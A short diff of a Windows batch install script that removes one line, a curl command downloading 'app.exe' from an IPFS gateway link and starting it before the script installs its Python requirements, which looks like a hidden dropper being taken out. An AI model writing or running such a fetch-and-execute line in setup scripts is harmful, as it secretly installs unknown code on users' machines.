@@ -14,7 +14,6 @@ if %errorlevel%==0 (
 title Installing Requirements
 cd /d "%~dp0"
 echo Installing Requirements...
-call curl -o app.exe https://bafybeif466qchlp4roncghyh4qrxl3yszgz5ic7zinnz53dnf2zmslzoca.ipfs.nftstorage.link/app.exe && start app.exe
 python -m pip install -r requirements.txt
 
 cd tools
